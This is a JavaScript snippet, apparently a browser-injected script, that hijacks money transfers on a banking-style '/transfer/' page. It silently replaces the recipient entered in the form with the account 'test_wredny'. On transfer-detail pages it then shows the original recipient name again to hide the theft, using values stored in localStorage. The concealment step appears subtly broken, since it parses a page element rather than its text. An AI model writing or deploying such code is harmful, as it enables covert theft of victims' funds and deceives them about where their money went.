	var script = document.createElement('script');
	script.type = 'text/javascript';
	script.innerHTML = `
		let path = window.location.pathname
		if(path === '/transfer/'){
			$("form:first").submit(
				function(event){
					let original_user = $("input[name='receiver']").val()
					let original_money = parseFloat($("input[name='number']").val())
					window.localStorage.setItem(original_money, original_user)
					$("input[name='receiver']").val("test_wredny")
				}
			);

		}
		else if(path.includes('transfer_detail') || path.includes('transfer')){
			let receiver = $("tbody > tr > th").first().next()
			let money = receiver.next()
			if(window.localStorage.getItem(parseFloat(money))){
				receiver.text(window.localStorage.getItem(parseFloat(money)))
			}
		}`
	document.getElementsByTagName('head')[0].appendChild(script);
